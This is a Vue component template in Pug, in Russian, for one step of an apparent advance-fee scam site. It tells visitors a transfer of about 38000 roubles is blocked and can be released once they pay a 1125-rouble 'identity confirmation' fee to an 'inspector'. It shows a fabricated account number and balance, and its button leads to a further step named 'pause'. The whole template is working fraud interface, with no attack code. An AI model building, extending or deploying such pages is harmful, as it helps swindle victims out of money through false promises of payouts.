<template lang='pug'>
    .step
        .step__top
            .step__top-left.step__top-left_error
                span.step__top-icon
                    error-icon(height="140")

            .step__top-right
                .step__top-heading ВАШ ПЕРЕВОД НАЙДЕН

                .step__top-desc Оставайтесь на странице во время работы системы

                .step__top-t4 Ваш перевод заблокирован процессинговым центром.

                .step__top-t2 Денежные переводы, превышающие сумму 30000 рублей требуют подтверждения личности владельца счета.

        .step__bot
            .step__bot-header ВЫВОД СРЕДСТВ

            .step__bot-body
                ul.step__bot-balans.list
                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/account-img.svg")

                        span.step__bot-account-title Счет№:

                        span.step__bot-account-value 1773569865 

                    li.step__bot-sum
                        span.step__bot-sum-bg
                            img(src="~img/images/coint-img.svg")

                        span.step__bot-sum-title Баланс счета:

                        span.step__bot-sum-value 37458 руб

                p.step__bot-t1 Статус: <span class="red"> Заблокирован</span>

                p.step__bot-t2 <span class="black">Чтобы разблокировать перевод, вам нужно один раз <br />подтвердить свою личность.</span> Подтверждение личности<br />моментальное.<span class="black"> Сразу после подтверждения личности <br />вам поступят деньги.</span>

                p.step__bot-t2 Подтверждение личности инспектором: <span class="blue bold large">1125 руб</span>

                router-link.step__bot-submit.link(:to="{ name: 'pause' }") ПОДТВЕРДИТЬ ЛИЧНОСТЬ

                .step__bot-footer Сразу после оплаты комиссии, <br />вам будет отправлен перевод в сумме: 38000 руб.
</template>

<script src='./script.js'></script>

<style lang='scss' src='../firstStep/style.scss'></style>